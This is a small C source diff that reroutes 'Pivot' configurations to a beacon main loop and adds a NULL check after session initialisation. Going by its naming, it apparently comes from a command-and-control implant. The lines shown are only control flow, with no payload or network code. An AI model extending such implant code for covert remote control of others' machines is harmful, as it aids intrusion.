@@ -2445,12 +2445,16 @@ VOID Final(VOID)
 	}
 #endif
 
-	if (pGlobalConfig->Type == Beacon) {
+	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
 		pBeaconClient = BeaconInit(pGlobalConfig);
 		BeaconMainLoop(pBeaconClient);
 	}
-	else if (pGlobalConfig->Type == Session || pGlobalConfig->Type == Pivot) {
+	else if (pGlobalConfig->Type == Session) {
 		pSessionClient = SessionInit(pGlobalConfig);
+		if (pSessionClient == NULL) {
+			goto CLEANUP;
+		}
+
 		SessionMainLoop(pSessionClient);
 	}
 	else {
